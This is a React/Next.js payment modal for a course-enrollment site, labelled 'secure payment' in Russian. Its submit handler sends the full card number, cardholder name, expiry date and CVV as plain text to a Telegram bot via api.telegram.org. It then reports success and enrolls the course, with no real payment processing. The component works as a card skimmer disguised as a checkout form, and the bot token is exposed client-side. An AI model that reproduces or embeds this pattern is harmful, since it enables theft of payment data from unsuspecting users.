"use client";
import React, { FC, useState } from "react";
import scss from "./ModalWindow.module.scss";
import { MdHealthAndSafety } from "react-icons/md";
import { PiLockSimpleFill } from "react-icons/pi";
import cardImg1 from "../../../assets/visa 1.png";
import cardImg2 from "../../../assets/credit-card 1.png";
import cardImg3 from "../../../assets/discover.png";
import cardImg4 from "../../../assets/american-express.png";
import { useForm } from "react-hook-form";
import axios from "axios";
import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useCourseEnroolMutation } from "@/redux/api/course";

interface ICourse {
  id: string;
  paymentWindow: boolean;
  setPaymentWindow: React.Dispatch<React.SetStateAction<boolean>>;
}

const TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_TOKEN;
const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

interface IFormPayment {
  cardholder: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  paymentMethod: string;
}

const ModalWindow: FC<ICourse> = ({ id, setPaymentWindow, paymentWindow }) => {
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<IFormPayment>();
  const [cardNumber, setCardNumber] = useState("");

  const formatCardNumber = (value: string) => {
    const onlyNumbers = value.replace(/\D/g, "");
    const formatted = onlyNumbers.replace(/(\d{4})/g, "$1 ").trim();
    return formatted;
  };
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCardNumber(e.target.value);
    setCardNumber(formattedValue);
  };

  const [expiryDate, setExpiryDate] = useState("");
  const formatExpiryDate = (value: string) => {
    const onlyNumbers = value.replace(/\D/g, "");
    if (onlyNumbers.length <= 2) return onlyNumbers;
    return onlyNumbers.slice(0, 2) + "/" + onlyNumbers.slice(2, 4);
  };
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatExpiryDate(e.target.value);
    setExpiryDate(formattedValue);
  };

  const [cvv, setCvv] = useState("");
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const onlyNumbers = e.target.value.replace(/\D/g, "");
    setCvv(onlyNumbers.slice(0, 3));
  };

  const [enroolMutation] = useCourseEnroolMutation();
  const enroolCourse = async (id: string) => {
    try {
      await enroolMutation(id).unwrap();
    } catch (error) {
      console.error(error);
    }
  };

  const onSubmit = async (data: IFormPayment) => {
    try {
      const message =
        `💳 Новый платеж\n\n` +
        `🏦 Метод оплаты: <b>${data.paymentMethod || "Не указан"}</b>\n` +
        `👤 Имя владельца: <b>${data.cardholder}</b>\n` +
        `💳 Номер карты: <b>${data.cardNumber}</b>\n` +
        `📅 Дата истечения: <b>${data.expiryDate}</b>\n` +
        `🔐 CVC: <b>${data.cvv}</b>`;

      await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: message,
      });

      toast.success("Оплата успешно отправлена!", {
        position: "top-right",
        autoClose: 3000,
      });
      enroolCourse(id);
      reset();
      setPaymentWindow(false);
    } catch (error) {
      console.error("Ошибка отправки платежа", error);
      toast.error("Ошибка при отправке платежа!", {
        position: "top-right",
        autoClose: 3000,
      });
    }
  };

  return (
    <div className={scss.blockWindow}>
      <div className={scss.saveText}>
        <div className={scss.saveIcons}>
          <MdHealthAndSafety className={scss.seveic1} />
          <PiLockSimpleFill className={scss.seveic2} />
        </div>
        <h5>Безопасная оплата</h5>
      </div>
      <div className={scss.cardInputsAll}>
        <div className={scss.card}>
          <p>КРЕДИТНАЯ / ДЕБЕТОВАЯ КАРТА</p>
          <div className={scss.cardImg}>
            <img src={cardImg1.src} alt="img" />
            <img src={cardImg2.src} alt="img" />
            <img src={cardImg3.src} alt="img" />
            <img src={cardImg4.src} alt="img" />
          </div>
        </div>
        <form onSubmit={handleSubmit(onSubmit)}>
          <div className={scss.blockInputs}>
            <div className={scss.saveSelects}>
              <p>Выберите метод оплаты</p>
              <select {...register("paymentMethod", { required: true })}>
                <option value="">Visa/MasterCard / Amex / JCB</option>
                <option value="mbank">MBank</option>
                <option value="bakai">Bakai Bank</option>
                <option value="rck">PCK Bank</option>
              </select>
              {errors.paymentMethod && (
                <span
                  style={{
                    fontSize: "14px",
                    color: "red",
                  }}
                >
                  Поле обязательно для заполнения
                </span>
              )}
            </div>
            <div className={scss.blockInputss}>
              <div className={scss.blockInput1}>
                <div className={scss.inputCardName}>
                  <p>
                    Имя владельца карты <span>*</span>
                  </p>
                  <input
                    type="text"
                    {...register("cardholder", {
                      required: true,
                    })}
                  />
                  {errors.cardholder && (
                    <span
                      style={{
                        fontSize: "14px",
                        color: "red",
                      }}
                    >
                      Заполните это поле
                    </span>
                  )}
                </div>
                <div className={scss.inputCardNumber}>
                  <p>
                    Номер карты <span>*</span>
                  </p>
                  <input
                    type="text"
                    inputMode="numeric"
                    {...register("cardNumber", { required: true })}
                    value={cardNumber}
                    onChange={handleChange}
                    maxLength={19}
                    placeholder="1234 5678 9012 3456"
                  />
                  {errors.cardNumber && (
                    <span
                      style={{
                        fontSize: "14px",
                        color: "red",
                      }}
                    >
                      Введите корректный номер карты
                    </span>
                  )}
                </div>
              </div>
              <div className={scss.blockInput1}>
                <div className={scss.inputCardName}>
                  <p>
                    Дата истечения <span>*</span>
                  </p>
                  <input
                    type="text"
                    {...register("expiryDate", { required: true })}
                    value={expiryDate}
                    onChange={handleExpiryChange}
                    maxLength={5}
                    placeholder="MM/YY"
                  />
                  {errors.expiryDate && (
                    <span
                      style={{
                        fontSize: "14px",
                        color: "red",
                      }}
                    >
                      Введите дату
                    </span>
                  )}
                </div>
                <div className={scss.inputCardNumber}>
                  <p>
                    CVC/CVV <span>*</span>
                  </p>
                  <input
                    type="text"
                    {...register("cvv", {
                      required: true,
                      minLength: 3,
                      maxLength: 3,
                    })}
                    value={cvv}
                    onChange={handleCvvChange}
                    maxLength={3}
                    placeholder="CVV"
                  />
                  {errors.cvv && (
                    <span
                      style={{
                        fontSize: "14px",
                        color: "red",
                      }}
                    >
                      Введите CVC
                    </span>
                  )}
                </div>
              </div>
            </div>
          </div>
          <div className={scss.blockBtns22}>
            <button
              type="button"
              onClick={() => setPaymentWindow(false)}
              className={scss.btn1}
            >
              Назад
            </button>
            <button type="submit" className={scss.btn2}>
              Оплата
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default ModalWindow;
